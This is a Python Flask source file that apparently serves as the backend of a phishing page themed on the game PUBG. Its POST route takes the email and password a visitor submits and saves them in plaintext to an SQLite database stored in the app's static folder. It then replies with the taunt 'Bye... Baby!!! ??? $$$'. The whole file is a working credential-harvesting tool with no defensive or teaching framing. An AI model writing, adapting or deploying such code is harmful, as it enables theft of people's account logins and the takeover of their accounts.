
from flask import Flask, request, render_template
import sqlite3
import os

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect(os.path.join(app.static_folder, 'PUBG.db'))
    return conn

@app.route('/')
def index():
    return render_template('index.html') 

@app.route('/PUBG', methods=['POST'])
def save_data():
    email = request.form['email']
    password = request.form['password']

    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO main (Gmail,Password) VALUES (?, ?)", (email, password))
        conn.commit()
        conn.close()
        return 'Bye... Baby!!! ??? $$$'
    except Exception as e:
        return f'An error occurred: {e}'

if __name__ == '__main__':
    app.run(debug=True)

